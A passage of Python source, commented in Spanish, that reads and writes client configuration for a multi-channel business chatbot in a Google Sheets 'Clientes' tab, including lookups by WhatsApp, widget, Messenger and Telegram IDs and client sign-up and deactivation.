    messenger_page_id = row[14].strip() if len(row) > 14 else ""
    agenda_citas = row[8].strip().upper() if len(row) > 8 else "SI"

    # Prioridad fija: phone_number_id > widget_id > messenger_page_id > telegram_chat_id. Si un
    # negocio tiene varios canales configurados (ej. widget + Telegram, o WhatsApp + Messenger),
    # siempre resulta en el MISMO business_id sin importar cuál de las funciones de búsqueda
    # encontró la fila.
    business_id = (
        phone_number_id
        or (f"widget:{widget_id}" if widget_id else "")
        or (f"messenger:{messenger_page_id}" if messenger_page_id else "")
        or f"telegram:{telegram_chat_id}"
    )

    return {
        "business_id": business_id,
        "phone_number_id": phone_number_id,
        "name": row[1].strip() if len(row) > 1 else "",
        "owner_phone": row[2].strip() if len(row) > 2 else "",
        "notify_also": row[3].strip() if len(row) > 3 else "",
        "info": row[5].strip() if len(row) > 5 else "",
        "tono": row[6].strip() if len(row) > 6 else "",
        "objetivo": row[7].strip() if len(row) > 7 else "",
        # Vacío/"SI" = usa citas (compatible con clientes ya dados de alta
        # antes de que esta columna existiera).
        "agenda_citas": agenda_citas not in ("NO", "FALSE", "0"),
        "widget_id": widget_id,
        "telegram_chat_id": telegram_chat_id,
        "messenger_page_id": messenger_page_id,
        "google_calendar_id": row[11].strip() if len(row) > 11 else "",
        # IANA (ej. "America/Tijuana", "America/Hermosillo") — el país tiene
        # varios husos horarios, no se puede asumir "hora del centro de
        # México" para todos. Vacío = usa America/Mexico_City por default.
        "zona_horaria": row[12].strip() if len(row) > 12 and row[12].strip() else "America/Mexico_City",
    }


def get_business_config_row(phone_number_id: str) -> dict | None:
    """Busca en la pestaña 'Clientes' el negocio dueño de este
    phone_number_id (el número de WhatsApp que recibió el mensaje). None si
    no hay ningún negocio dado de alta con ese número, o si está marcado
    como inactivo (cliente canceló mantenimiento — se apaga sin borrar
    nada, por si vuelve a activarse después)."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        return None
    try:
        _ensure_tab_exists(sheet_id, CLIENTES_TAB, CLIENTES_HEADERS)
        rows = _values_get(sheet_id, f"'{CLIENTES_TAB}'!A2:O")
        for row in rows:
            if len(row) >= 1 and row[0].strip() == phone_number_id:
                return _row_to_business_config(row)
        return None
    except Exception:
        log.exception("No se pudo leer la pestaña Clientes de Google Sheets")
        return None


def get_business_config_by_widget_id(widget_id: str) -> dict | None:
    """Como get_business_config_row, pero busca por 'Widget ID' (columna J)
    en vez de por Phone Number ID — para negocios que usan el chat de su
    página web en vez de (o además de) WhatsApp."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id or not widget_id:
        return None
    try:
        _ensure_tab_exists(sheet_id, CLIENTES_TAB, CLIENTES_HEADERS)
        rows = _values_get(sheet_id, f"'{CLIENTES_TAB}'!A2:O")
        for row in rows:
            if len(row) > 9 and row[9].strip() == widget_id:
                return _row_to_business_config(row)
        return None
    except Exception:
        log.exception("No se pudo leer la pestaña Clientes de Google Sheets (por widget_id)")
        return None


def get_business_config_by_page_id(page_id: str) -> dict | None:
    """Como get_business_config_row, pero busca por 'Messenger Page ID' (columna O) — para
    negocios que contestan por su página de Facebook en vez de (o además de) WhatsApp/web."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id or not page_id:
        return None
    try:
        _ensure_tab_exists(sheet_id, CLIENTES_TAB, CLIENTES_HEADERS)
        rows = _values_get(sheet_id, f"'{CLIENTES_TAB}'!A2:O")
        for row in rows:
            if len(row) > 14 and row[14].strip() == page_id:
                return _row_to_business_config(row)
        return None
    except Exception:
        log.exception("No se pudo leer la pestaña Clientes de Google Sheets (por page_id)")
        return None


def get_business_config_by_telegram_chat_id(chat_id: str) -> dict | None:
    """Como las anteriores, pero busca por 'Telegram Chat ID' (columna K) —
    para resolver a qué negocio pertenece un mensaje que llega por el
    webhook de Telegram (dueños de negocios sin WhatsApp propio reciben y
    contestan avisos de citas por ahí en vez de por WhatsApp)."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id or not chat_id:
        return None
    try:
        _ensure_tab_exists(sheet_id, CLIENTES_TAB, CLIENTES_HEADERS)
        rows = _values_get(sheet_id, f"'{CLIENTES_TAB}'!A2:O")
        for row in rows:
            if len(row) > 10 and row[10].strip() == str(chat_id):
                return _row_to_business_config(row)
        return None
    except Exception:
        log.exception("No se pudo leer la pestaña Clientes de Google Sheets (por telegram_chat_id)")
        return None


def _slug(texto: str) -> str:
    s = re.sub(r"[^a-z0-9]+", "-", texto.strip().lower()).strip("-")
    return s or "negocio"


def desactivar_cliente(bot_name: str) -> bool:
    """Pone 'Activo' = NO en la fila de 'Clientes' que tenga ese nombre exacto (columna B). Se usa cuando el
    cliente cancela su suscripción, para que el bot deje de contestarle sin que alguien tenga que entrar a
    Sheets a mano. Funciona igual para el canal web o WhatsApp. Devuelve True si encontró y apagó la fila."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    nombre = (bot_name or "").strip()
    if not sheet_id or not nombre:
        return False
    rows = _values_get(sheet_id, f"'{CLIENTES_TAB}'!A2:N")
    for i, row in enumerate(rows):
        if len(row) > 1 and row[1].strip() == nombre:
            _values_update(sheet_id, f"'{CLIENTES_TAB}'!E{i + 2}", [["NO"]])
            return True
    return False


def dar_de_alta_cliente(
    business_name: str, owner_phone: str, info: str, tono: str, objetivo: str,
    agenda_citas: bool, telegram_username: str, zona_horaria: str = "", calendar_id: str = "",
) -> dict:
    """Da de alta automáticamente un negocio del canal web/app en la pestaña 'Clientes', al momento de pagar.
    Genera un Widget ID único y un nombre de reporte (columna 'Nombre del negocio') que no choque con uno ya
    existente. No toca nada de WhatsApp (Phone Number ID queda vacío). Devuelve {"widget_id", "bot_name"}."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    if not sheet_id:
        raise RuntimeError("Falta GOOGLE_SHEET_ID")
    _ensure_tab_exists(sheet_id, CLIENTES_TAB, CLIENTES_HEADERS)
    existentes = _values_get(sheet_id, f"'{CLIENTES_TAB}'!A2:N")

    nombres = {(r[1].strip() if len(r) > 1 else "") for r in existentes}
    bot_name = business_name.strip() or "Negocio"
    intento = bot_name
    n = 2
    while intento in nombres:
        intento = f"{bot_name} ({n})"
        n += 1
    bot_name = intento

    widget_ids = {(r[9].strip() if len(r) > 9 else "") for r in existentes}
    base = _slug(business_name)
    widget_id = f"{base}-{secrets.token_hex(2)}"
    while widget_id in widget_ids:
        widget_id = f"{base}-{secrets.token_hex(2)}"

    fila = [
        "",  # Phone Number ID (vacío: no es un número de WhatsApp)
        _safe_cell(bot_name),
        _safe_cell(owner_phone or ""),
        "",  # Teléfonos adicionales
        "SI",  # Activo
        _safe_cell(info),
        _safe_cell(tono),
        _safe_cell(objetivo),
        "SI" if agenda_citas else "NO",
        widget_id,
        "",  # Telegram Chat ID: se llena solo en cuanto el dueño le escriba al bot de avisos
        calendar_id or "",
        zona_horaria,
        (telegram_username or "").lstrip("@").strip().lower(),
    ]
    _values_append(sheet_id, f"'{CLIENTES_TAB}'!A:N", [fila])
    return {"widget_id": widget_id, "bot_name": bot_name}


def intentar_vincular_telegram(username: str, chat_id: str) -> str | None:
    """Cuando alguien le escribe por primera vez al bot de avisos y su chat_id no está dado de alta en ningún
    negocio: busca una fila de 'Clientes' cuyo Telegram Chat ID esté vacío y cuyo 'Telegram pendiente (usuario)'
    coincida con este @usuario, y la vincula sola. Devuelve el nombre del negocio si lo encontró y vinculó."""
    sheet_id = os.getenv("GOOGLE_SHEET_ID")
    u = (username or "").lstrip("@").strip().lower()
    if not sheet_id or not u:
        return None
    try:
        rows = _values_get(sheet_id, f"'{CLIENTES_TAB}'!A2:N")
        for i, row in enumerate(rows):
            chat_actual = row[10].strip() if len(row) > 10 else ""
            pendiente = row[13].strip().lower() if len(row) > 13 else ""
            if not chat_actual and pendiente and pendiente == u:
                fila_real = i + 2
                _values_update(sheet_id, f"'{CLIENTES_TAB}'!K{fila_real}", [[str(chat_id)]])
                return row[1] if len(row) > 1 else "tu negocio"
        return None
    except Exception:
        log.exception("No se pudo intentar vincular Telegram automáticamente (usuario %s)", u)
        return None
